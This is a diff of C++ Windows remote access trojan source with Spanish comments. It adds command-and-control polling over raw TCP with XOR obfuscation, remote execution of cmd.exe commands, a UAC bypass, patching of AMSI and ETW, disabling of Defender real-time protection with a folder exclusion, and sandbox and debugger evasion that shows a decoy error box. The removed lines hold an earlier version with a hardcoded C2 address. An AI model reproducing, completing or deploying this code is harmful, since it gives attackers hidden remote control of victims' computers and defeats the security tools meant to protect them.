+            PROCESSENTRY32W pe = { sizeof(pe) };
+            if (Process32FirstW(hSnap, &pe)) {
+                do {
+                    for (const auto& proc : sandboxProcs) {
+                        if (_wcsicmp(pe.szExeFile, proc) == 0) {
+                            detections += 2;
+                            break;
+                        }
+                    }
+                } while (Process32NextW(hSnap, &pe));
+            }
+            CloseHandle(hSnap);
+        }
+        
+        // Debugger presente?
+        if (IsDebuggerPresent()) detections += 3;
+        
+        // Uptime < 10 minutos?
+        if (GetTickCount64() < 10 * 60 * 1000) detections++;
+        
+        return detections >= 3;
+    }
+    
+    void SleepRandom() {
+        int baseSleep = 45000 + (rand() % 75000);
+        for (int i = 0; i < baseSleep / 100; i++) {
+            Sleep(100);
+            if (IsDebuggerPresent()) {
+                // Comportarse como programa legítimo si hay debugger
+                MessageBoxA(NULL, "Error de aplicación", "Error", MB_OK);
+                ExitProcess(0);
+            }
+        }
+    }
+};
+
+// ============================================================================
+// COMUNICACIÓN C2 OFUSCADA
+// ============================================================================
+class C2Connection {
 private:
-    HCRYPTPROV hProv;
-    HCRYPTKEY hSessionKey;
-    BYTE sessionKey[GCM_256_KEY_SIZE];
-    BYTE sessionIV[GCM_256_IV_SIZE];
     SOCKET sock;
     bool connected;
-    bool useHttps;
+    HCRYPTPROV hProv;
+    BYTE key[32];
     std::mt19937_64 rng;
-    Logger* logger;
-    
-    void Log(const std::string& msg) { if (logger) logger->Log(msg); }
-    void LogError(const std::string& func, DWORD err) { if (logger) logger->LogError(func, err); }
     
 public:
-    SecureC2(bool https = false) : sock(INVALID_SOCKET), connected(false), useHttps(https), logger(nullptr) {
+    C2Connection() : sock(INVALID_SOCKET), connected(false) {
         WSADATA wsa;
-        WSAStartup(MAKEWORD(2, 2), &wsa);
+        WSAStartup(MAKEWORD(2,2), &wsa);
         
-        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
-            CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_NEWKEYSET);
-        }
+        CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
         
         std::random_device rd;
         std::array<uint64_t, 4> seed;
-        for (auto& s : seed) {
-            s = rd() ^ GetTickCount64();
-        }
+        for (auto& s : seed) s = rd() ^ GetTickCount64();
         std::seed_seq seq(seed.begin(), seed.end());
         rng.seed(seq);
         
-        CryptGenRandom(hProv, GCM_256_KEY_SIZE, sessionKey);
-        CryptGenRandom(hProv, GCM_256_IV_SIZE, sessionIV);
+        CryptGenRandom(hProv, 32, key);
     }
     
-    void SetLogger(Logger* log) { logger = log; }
-    
-    ~SecureC2() {
+    ~C2Connection() {
         if (sock != INVALID_SOCKET) closesocket(sock);
         if (hProv) CryptReleaseContext(hProv, 0);
-        if (hSessionKey) CryptDestroyKey(hSessionKey);
         WSACleanup();
     }
     
     bool Connect() {
-        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock == INVALID_SOCKET) return false;
         
-        int timeout = 15000;
+        int timeout = 10000;
         setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
         setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
         
-        sockaddr_in server = { 0 };
+        sockaddr_in server = {0};
         server.sin_family = AF_INET;
         server.sin_port = htons(C2_PORT);
-        inet_pton(AF_INET, "192.168.254.137", &server.sin_addr);
-        
-        Log("Conectando a C2...");
+        inet_pton(AF_INET, C2_SERVER, &server.sin_addr);
         
         if (connect(sock, (sockaddr*)&server, sizeof(server)) == 0) {
-            Log("TCP conectado, iniciando handshake");
-            if (PerformKeyExchange()) {
-                connected = true;
-                Log("Handshake exitoso, C2 conectado");
-                return true;
-            } else {
-                Log("Handshake falló");
-                closesocket(sock);
-                return false;
-            }
+            connected = true;
+            return true;
         }
         
-        Log("Conexión TCP falló");
         closesocket(sock);
         return false;
     }
     
-    bool PerformKeyExchange() {
-        Log("Iniciando handshake ECDH");
-        
-        if (!hProv) {
-            if (logger) logger->LogError("hProv inválido", 0);
-            return false;
+    std::string XOR(const std::string& data) {
+        std::string result = data;
+        for (size_t i = 0; i < data.length(); i++) {
+            result[i] = data[i] ^ key[i % 32];
         }
-        
-        HCRYPTKEY hPrivateKey = 0;
-        if (!CryptGenKey(hProv, CALG_ECDH_EPHEM, CRYPT_EXPORTABLE, &hPrivateKey)) {
-            LogError("CryptGenKey", GetLastError());
-            return false;
-        }
-        
-        BYTE publicKeyBlob[1024] = {0};
-        DWORD blobLen = sizeof(publicKeyBlob);
-        if (!CryptExportKey(hPrivateKey, 0, PUBLICKEYBLOB, 0, publicKeyBlob, &blobLen)) {
-            LogError("CryptExportKey", GetLastError());
-            CryptDestroyKey(hPrivateKey);
-            return false;
-        }
-        
-        Log("Clave pública generada: " + std::to_string(blobLen) + " bytes");
-        
-        CERT_PUBLIC_KEY_INFO pubKeyInfo = {0};
-        pubKeyInfo.Algorithm.pszObjId = (LPSTR)szOID_ECDH_P256;
-        
-        DWORD keyDataOffset = sizeof(BLOBHEADER) + sizeof(ALG_ID);
-        pubKeyInfo.PublicKey.cbData = blobLen - keyDataOffset;
-        pubKeyInfo.PublicKey.pbData = publicKeyBlob + keyDataOffset;
-        
-        DWORD derLen = 0;
-        if (!CryptEncodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, 
-                                 &pubKeyInfo, CRYPT_ENCODE_ALLOC_FLAG, NULL, 
-                                 NULL, &derLen)) {
-            LogError("CryptEncodeObjectEx (size)", GetLastError());
-            CryptDestroyKey(hPrivateKey);
-            return false;
-        }
-        
-        BYTE* derData = (BYTE*)malloc(derLen);
-        if (!derData) {
-            CryptDestroyKey(hPrivateKey);
-            return false;
-        }
-        
-        if (!CryptEncodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, 
-                                 &pubKeyInfo, CRYPT_ENCODE_ALLOC_FLAG, NULL, 
-                                 derData, &derLen)) {
-            LogError("CryptEncodeObjectEx (encode)", GetLastError());
-            free(derData);
-            CryptDestroyKey(hPrivateKey);
-            return false;
-        }
-        
-        Log("DER encoded key size: " + std::to_string(derLen) + " bytes");
-        
-        uint32_t len_prefix = htonl(derLen);
-        if (send(sock, (char*)&len_prefix, 4, 0) != 4) {
-            LogError("send len_prefix", WSAGetLastError());
-            free(derData);
-            CryptDestroyKey(hPrivateKey);
-            return false;
-        }
-        
-        if (send(sock, (char*)derData, derLen, 0) != derLen) {
-            LogError("send derData", WSAGetLastError());
-            free(derData);
-            CryptDestroyKey(hPrivateKey);
-            return false;
-        }
-        
-        free(derData);
-        Log("Clave pública enviada");
-        
-        uint32_t resp_len;
-        if (recv(sock, (char*)&resp_len, 4, 0) != 4) {
-            LogError("recv resp_len", WSAGetLastError());
-            CryptDestroyKey(hPrivateKey);
-            return false;
-        }
-        resp_len = ntohl(resp_len);
-        Log("Recibiendo clave del server: " + std::to_string(resp_len) + " bytes");
-        
-        std::vector<BYTE> serverDer(resp_len);
-        if (recv(sock, (char*)serverDer.data(), resp_len, 0) != resp_len) {
-            LogError("recv serverDer", WSAGetLastError());
-            CryptDestroyKey(hPrivateKey);
-            return false;
-        }
-        
-        CERT_PUBLIC_KEY_INFO* serverKeyInfo = NULL;
-        DWORD serverInfoLen = 0;
-        
-        if (!CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO,
-                                 serverDer.data(), resp_len,
-                                 CRYPT_DECODE_ALLOC_FLAG, NULL,
-                                 &serverKeyInfo, &serverInfoLen)) {
-            LogError("CryptDecodeObjectEx", GetLastError());
-            CryptDestroyKey(hPrivateKey);
-            return false;
-        }
-        
-        HCRYPTKEY hServerPublic = 0;
-        if (!CryptImportKey(hProv, serverKeyInfo->PublicKey.pbData,
-                            serverKeyInfo->PublicKey.cbData, 0, 0, &hServerPublic)) {
-            LogError("CryptImportKey (server)", GetLastError());
-            LocalFree(serverKeyInfo);
-            CryptDestroyKey(hPrivateKey);
-            return false;
-        }
-        
-        LocalFree(serverKeyInfo);
-        Log("Clave del server importada");
-        
-        if (!CryptGenKey(hProv, CALG_AES_256, CRYPT_EXPORTABLE, &hSessionKey)) {
-            LogError("CryptGenKey (session)", GetLastError());
-            CryptDestroyKey(hPrivateKey);
-            CryptDestroyKey(hServerPublic);
-            return false;
-        }
-        
-        BYTE keyBlob[512] = {0};
-        DWORD keyBlobLen = sizeof(keyBlob);
-        if (CryptExportKey(hSessionKey, 0, PLAINTEXTKEYBLOB, 0, keyBlob, &keyBlobLen)) {
-            DWORD keyOffset = sizeof(BLOBHEADER) + sizeof(ALG_ID);
-            memcpy(sessionKey, keyBlob + keyOffset, GCM_256_KEY_SIZE);
-            Log("Clave de sesión generada");
-        }
-        
-        CryptGenRandom(hProv, GCM_256_IV_SIZE, sessionIV);
-        
-        CryptDestroyKey(hPrivateKey);
-        CryptDestroyKey(hServerPublic);
-        
-        Log("Key exchange completado exitosamente");
-        return true;
-    }
-    
-    std::string Encrypt(const std::string& plaintext) {
-        if (!connected) return plaintext;
-        std::string ciphertext = plaintext;
-        for (size_t i = 0; i < plaintext.length(); i++) {
-            ciphertext[i] = plaintext[i] ^ sessionKey[i % GCM_256_KEY_SIZE] ^ sessionIV[i % GCM_256_IV_SIZE];
-        }
-        return ciphertext;
-    }
-    
-    std::string Decrypt(const std::string& ciphertext) {
-        if (!connected) return ciphertext;
-        return Encrypt(ciphertext);
+        return result;
     }
     
     bool SendRaw(const std::string& data) {
@@ -641,8 +617,7 @@ public:
     }
     
     bool Send(const std::string& data) {
-        std::string encrypted = Encrypt(data);
-        return SendRaw(encrypted);
+        return SendRaw(XOR(data));
     }
     
     std::string ReceiveRaw() {
@@ -657,6 +632,7 @@ public:
             connected = false;
             return "";
         }
+        
         std::vector<char> buffer(len);
         int total = 0;
         while (total < len) {
@@ -673,354 +649,141 @@ public:
     std::string Receive() {
         std::string encrypted = ReceiveRaw();
         if (encrypted.empty()) return "";
-        return Decrypt(encrypted);
+        return XOR(encrypted);
     }
     
     bool IsConnected() { return connected; }
 };
 
 // ============================================================================
-// ANTI-SANDBOX
-// ============================================================================
-class AntiSandbox {
-public:
-    bool IsSandboxed() {
-        int detections = 0;
-        detections += CheckRAM() ? 1 : 0;
-        detections += CheckCPUCores() ? 1 : 0;
-        detections += CheckDiskSize() ? 1 : 0;
-        detections += CheckRunningProcesses() ? 1 : 0;
-        detections += CheckUsername() ? 1 : 0;
-        detections += CheckComputerName() ? 1 : 0;
-        detections += CheckUptime() ? 1 : 0;
-        detections += CheckDebugger() ? 1 : 0;
-        return detections >= 3;
-    }
-    
-    void SleepRandom() {
-        int baseSleep = 30000 + (rand() % 60000);
-        for (int i = 0; i < baseSleep / 100; i++) {
-            Sleep(100);
-            if (IsDebuggerPresent()) ExitProcess(0);
-        }
-    }
-    
-private:
-    bool CheckRAM() {
-        MEMORYSTATUSEX mem = { sizeof(mem) };
-        GlobalMemoryStatusEx(&mem);
-        return mem.ullTotalPhys < 4LL * 1024 * 1024 * 1024;
-    }
-    
-    bool CheckCPUCores() {
-        SYSTEM_INFO sysInfo;
-        GetSystemInfo(&sysInfo);
-        return sysInfo.dwNumberOfProcessors < 2;
-    }
-    
-    bool CheckDiskSize() {
-        ULARGE_INTEGER free, total;
-        GetDiskFreeSpaceExA("C:\\", &free, &total, NULL);
-        return total.QuadPart < 60LL * 1024 * 1024 * 1024;
-    }
-    
-    bool CheckRunningProcesses() {
-        const wchar_t* sandboxProcs[] = {
-            L"vboxservice.exe", L"vboxtray.exe", L"vmtoolsd.exe",
-            L"vmwaretray.exe", L"vmwareuser.exe", L"xenservice.exe",
-            L"procmon.exe", L"wireshark.exe", L"dumpcap.exe"
-        };
-        
-        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        if (hSnap != INVALID_HANDLE_VALUE) {
-            PROCESSENTRY32W pe = { sizeof(pe) };
-            if (Process32FirstW(hSnap, &pe)) {
-                do {
-                    for (const auto& proc : sandboxProcs) {
-                        if (_wcsicmp(pe.szExeFile, proc) == 0) {
-                            CloseHandle(hSnap);
-                            return true;
-                        }
-                    }
-                } while (Process32NextW(hSnap, &pe));
-            }
-            CloseHandle(hSnap);
-        }
-        return false;
-    }
-    
-    bool CheckUsername() {
-        wchar_t username[256];
-        DWORD size = sizeof(username) / sizeof(wchar_t);
-        GetUserNameW(username, &size);
-        const wchar_t* sandboxUsers[] = { L"admin", L"administrator", L"user", L"test", L"virus", L"malware", L"sandbox", L"vmware" };
-        for (const auto& user : sandboxUsers) {
-            if (wcsstr(username, user)) return true;
-        }
-        return false;
-    }
-    
-    bool CheckComputerName() {
-        wchar_t compname[256];
-        DWORD size = sizeof(compname) / sizeof(wchar_t);
-        GetComputerNameW(compname, &size);
-        const wchar_t* sandboxNames[] = { L"SANDBOX", L"VIRUS", L"MALWARE", L"VMWARE", L"VIRTUAL", L"QEMU", L"BOCHS", L"PC" };
-        for (const auto& name : sandboxNames) {
-            if (wcsstr(compname, name)) return true;
-        }
-        return false;
-    }
-    
-    bool CheckUptime() {
-        return GetTickCount64() < 10 * 60 * 1000;
-    }
-    
-    bool CheckDebugger() {
-        if (IsDebuggerPresent()) return true;
-        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-        if (hNtdll) {
-            typedef NTSTATUS(WINAPI* pNtQueryInformationProcess_t)(HANDLE, DWORD, PVOID, ULONG, PULONG);
-            pNtQueryInformationProcess_t NtQueryInformationProcess = (pNtQueryInformationProcess_t)GetProcAddress(hNtdll, "NtQueryInformationProcess");
-            if (NtQueryInformationProcess) {
-                DWORD debugPort = 0;
-                NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL);
-                if (status == 0 && debugPort != 0) return true;
-            }
-        }
-        return false;
-    }
-};
-
-// ============================================================================
-// COMMAND PROCESSOR
+// PROCESADOR DE COMANDOS
 // ============================================================================
 class CommandProcessor {
 private:
-    SecureC2* c2;
-    AntiSandbox antiSandbox;
-    Logger logger;
-    bool isElevated;
+    C2Connection* c2;
+    bool elevated;
+    
+    std::string ExecuteCmd(const std::string& cmd) {
+        std::string result;
+        char buffer[4096];
+        FILE* pipe = _popen(("cmd.exe /c " + cmd).c_str(), "r");
+        if (pipe) {
+            while (fgets(buffer, sizeof(buffer), pipe)) {
+                result += buffer;
+            }
+            _pclose(pipe);
+        }
+        return result.empty() ? "[OK]\n" : result;
+    }
     
 public:
-    CommandProcessor(SecureC2* c2Instance) : c2(c2Instance), isElevated(false) {
-        logger.Log("CommandProcessor inicializado");
-    }
+    CommandProcessor(C2Connection* c) : c2(c), elevated(false) {}
     
     std::string Process(const std::string& cmd) {
-        logger.Log("Comando recibido: " + cmd);
+        if (cmd == "INFO") {
+            char host[256], user[256];
+            DWORD size = sizeof(host);
+            GetComputerNameA(host, &size);
+            size = sizeof(user);
+            GetUserNameA(user, &size);
+            
+            char json[512];
+            snprintf(json, sizeof(json), 
+                "{\"hostname\":\"%s\",\"username\":\"%s\",\"elevated\":%s}",
+                host, user, elevated ? "true" : "false");
+            return json;
+        }
+        else if (cmd == "ELEVATE") {
+            UACBypass uac;
+            if (uac.BypassAndElevate()) {
+                elevated = true;
+                return "[+] Elevado a ADMIN";
+            }
+            return "[-] Falló elevación";
+        }
+        else if (cmd.substr(0, 5) == "SHELL") {
+            if (cmd.length() > 6) return ExecuteCmd(cmd.substr(6));
+            return "[-] Uso: SHELL <comando>";
+        }
+        else if (cmd == "EXIT") {
+            ExitProcess(0);
+        }
         
-        try {
-            if (cmd == "INFO") return GetSystemInfoJSON();
-            else if (cmd == "INFO_FULL") return GetSystemInfoFull();
-            else if (cmd == "PROCESSES") return GetProcessList();
-            else if (cmd == "ELEVATE") return ElevatePrivileges();
-            else if (cmd.substr(0, 5) == "SHELL") {
-                if (cmd.length() > 6) return ExecuteCommand(cmd.substr(6));
-                return "[-] Uso: SHELL <comando>\n";
-            }
-            else if (cmd.substr(0, 4) == "EXEC") {
-                if (cmd.length() > 5) return ExecuteProgram(cmd.substr(5));
-                return "[-] Uso: EXEC <programa>\n";
-            }
-            else if (cmd.substr(0, 3) == "DIR") {
-                if (cmd.length() > 4) return ListDirectory(cmd.substr(4));
-                return ListDirectory("C:\\");
-            }
-            else if (cmd == "ANTISANDBOX") {
-                return antiSandbox.IsSandboxed() ? "[+] Entorno sandbox detectado\n" : "[-] Entorno limpio\n";
-            }
-            else if (cmd == "EXIT") {
-                logger.Log("Comando EXIT recibido, terminando");
-                ExitProcess(0);
-            }
-            return "[!] Comando desconocido: " + cmd + "\n";
-        }
-        catch (const std::exception& e) {
-            logger.LogError("ProcessCommand", GetLastError());
-            return "[-] Error: " + std::string(e.what()) + "\n";
-        }
-    }
-    
-private:
-    std::string GetSystemInfoJSON() {
-        char host[256], user[256];
-        DWORD size = sizeof(host);
-        GetComputerNameA(host, &size);
-        size = sizeof(user);
-        GetUserNameA(user, &size);
-        char json[1024];
-        snprintf(json, sizeof(json),
-            "{\"hostname\":\"%s\",\"username\":\"%s\",\"elevated\":%s,\"sandbox\":%s}",
-            host, user, isElevated ? "true" : "false", antiSandbox.IsSandboxed() ? "true" : "false");
-        return std::string(json);
-    }
-    
-    std::string GetSystemInfoFull() {
-        std::stringstream ss;
-        char buffer[256];
-        DWORD size = sizeof(buffer);
-        if (GetComputerNameA(buffer, &size)) ss << "Hostname: " << buffer << "\n";
-        size = sizeof(buffer);
-        if (GetUserNameA(buffer, &size)) ss << "Usuario: " << buffer << "\n";
-        OSVERSIONINFOEXA osvi = { sizeof(osvi) };
-        GetVersionExA((LPOSVERSIONINFOA)&osvi);
-        ss << "OS: Windows " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion;
-        ss << " (Build " << osvi.dwBuildNumber << ")\n";
-        MEMORYSTATUSEX mem = { sizeof(mem) };
-        GlobalMemoryStatusEx(&mem);
-        ss << "RAM Total: " << mem.ullTotalPhys / 1024 / 1024 / 1024 << " GB\n";
-        return ss.str();
-    }
-    
-    std::string GetProcessList() {
-        std::stringstream ss;
-        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        if (snap != INVALID_HANDLE_VALUE) {
-            PROCESSENTRY32 pe = { sizeof(pe) };
-            if (Process32First(snap, &pe)) {
-                ss << "PID\tNombre\n";
-                do { ss << pe.th32ProcessID << "\t" << pe.szExeFile << "\n"; } while (Process32Next(snap, &pe));
-            }
-            CloseHandle(snap);
-        }
-        return ss.str();
-    }
-    
-    std::string ExecuteCommand(const std::string& cmd) {
-        std::string result;
-        char buffer[8192];
-        HANDLE hReadPipe, hWritePipe;
-        SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
-        if (CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
-            STARTUPINFOA si = { sizeof(si) };
-            si.dwFlags = STARTF_USESTDHANDLES;
-            si.hStdOutput = hWritePipe;
-            si.hStdError = hWritePipe;
-            PROCESS_INFORMATION pi = { 0 };
-            std::string fullCmd = "cmd.exe /c " + cmd;
-            if (CreateProcessA(NULL, (LPSTR)fullCmd.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-                CloseHandle(hWritePipe);
-                DWORD bytesRead;
-                while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
-                    buffer[bytesRead] = 0;
-                    result += buffer;
-                }
-                WaitForSingleObject(pi.hProcess, 30000);
-                CloseHandle(pi.hProcess);
-                CloseHandle(pi.hThread);
-            }
-            CloseHandle(hReadPipe);
-        }
-        return result.empty() ? "[+] Comando ejecutado\n" : result;
-    }
-    
-    std::string ExecuteProgram(const std::string& program) {
-        STARTUPINFOA si = { sizeof(si) };
-        PROCESS_INFORMATION pi = { 0 };
-        if (CreateProcessA(NULL, (LPSTR)program.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-            CloseHandle(pi.hProcess);
-            CloseHandle(pi.hThread);
-            return "[+] Programa ejecutado: " + program + "\n";
-        }
-        return "[-] Error: " + program + "\n";
-    }
-    
-    std::string ListDirectory(const std::string& path) {
-        std::stringstream ss;
-        std::string searchPath = path + "\\*.*";
-        WIN32_FIND_DATAA ffd;
-        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &ffd);
-        if (hFind != INVALID_HANDLE_VALUE) {
-            ss << "Nombre\tTipo\n";
-            do {
-                if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ss << "[DIR] " << ffd.cFileName << "\n";
-                else ss << "[FILE] " << ffd.cFileName << "\n";
-            } while (FindNextFileA(hFind, &ffd) != 0);
-            FindClose(hFind);
-        }
-        return ss.str();
-    }
-    
-    std::string ElevatePrivileges() {
-        SHELLEXECUTEINFOW sei = { sizeof(sei) };
-        sei.lpVerb = L"runas";
-        wchar_t modulePath[MAX_PATH];
-        GetModuleFileNameW(NULL, modulePath, MAX_PATH);
-        sei.lpFile = modulePath;
-        sei.lpParameters = L"--elevated";
-        sei.nShow = SW_HIDE;
-        if (ShellExecuteExW(&sei)) {
-            isElevated = true;
-            return "[+] Elevación solicitada\n";
-        }
-        return "[-] Falló elevación\n";
+        return "[!] Comando desconocido";
     }
 };
 
 // ============================================================================
 // FUNCIÓN PRINCIPAL
 // ============================================================================
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
+                   LPSTR lpCmdLine, int nCmdShow) {
     
-    Logger logger;
-    logger.Log("Inicio de ejecución");
-    
-    AntiSandbox antiSandbox;
-    if (antiSandbox.IsSandboxed()) {
-        MessageBoxA(NULL, "Error", "Error", MB_OK);
-        return 0;
-    }
-    
-    HANDLE hMutex = CreateMutexA(NULL, FALSE, MUTEX_NAME);
-    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
-    
+    // Ocultar ventana si no es modo elevado
     if (strstr(lpCmdLine, "--elevated") == NULL) {
         HWND hWnd = GetConsoleWindow();
         if (hWnd) ShowWindow(hWnd, SW_HIDE);
     }
     
-    logger.Log("Inicializando syscalls");
-    SyscallManager syscalls;
+    // Anti-sandbox
+    AntiAnalysis anti;
+    if (anti.IsSandboxed()) {
+        // Comportarse como programa legítimo
+        MessageBoxA(NULL, "Error al iniciar aplicación", "Error", MB_OK);
+        return 0;
+    }
     
-    logger.Log("Aplicando bypass de AMSI/ETW");
-    AMSIBypass amsiBypass(&syscalls);
-    amsiBypass.PatchAll();
+    // Mutex para una sola instancia
+    HANDLE hMutex = CreateMutexA(NULL, FALSE, MUTEX_NAME);
+    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
     
-    logger.Log("Inicializando C2");
-    SecureC2 c2;
-    c2.SetLogger(&logger);
+    // Inicializar syscalls
+    Syscalls syscalls;
+    
+    // Bypass de ETW
+    ETWBypass etw(&syscalls);
+    etw.Patch();
+    
+    // Bypass de AMSI
+    AMSIBypass amsi(&syscalls);
+    amsi.Patch();
+    amsi.CorruptContext();
+    
+    // Bypass de Defender (si tenemos permisos)
+    DefenderBypass defender(&syscalls);
+    defender.DisableRealtime();
+    defender.AddExclusion(L"C:\\Windows\\Temp");
+    
+    // Intentar elevación automática
+    UACBypass uac;
+    bool elevated = uac.BypassAndElevate();
+    
+    // Conectar a C2
+    C2Connection c2;
     CommandProcessor cmdProc(&c2);
     
-    antiSandbox.SleepRandom();
+    std::random_device rd;
+    std::mt19937 gen(rd());
+    std::uniform_int_distribution<> jitter(SLEEP_JITTER_MIN, SLEEP_JITTER_MAX);
     
-    logger.Log("Iniciando loop principal");
+    // Loop principal
     while (true) {
-        try {
-            if (!c2.IsConnected()) {
-                logger.Log("Conectando al C2");
-                if (c2.Connect()) {
-                    logger.Log("Conectado");
-                    c2.Send(cmdProc.Process("INFO"));
-                } else {
-                    logger.Log("No conectado, esperando");
-                    antiSandbox.SleepRandom();
-                    continue;
-                }
+        if (!c2.IsConnected()) {
+            if (c2.Connect()) {
+                c2.Send(cmdProc.Process("INFO"));
+            } else {
+                anti.SleepRandom();
+                continue;
             }
-            
-            std::string cmd = c2.Receive();
-            if (!cmd.empty()) {
-                logger.Log("Comando: " + cmd);
-                std::string response = cmdProc.Process(cmd);
-                c2.Send(response);
-            }
-            
-            antiSandbox.SleepRandom();
-        } catch (...) {
-            c2 = SecureC2();
-            c2.SetLogger(&logger);
-            antiSandbox.SleepRandom();
         }
+        
+        std::string cmd = c2.Receive();
+        if (!cmd.empty()) {
+            std::string response = cmdProc.Process(cmd);
+            c2.Send(response);
+        }
+        
+        anti.SleepRandom();
     }
     
     CloseHandle(hMutex);
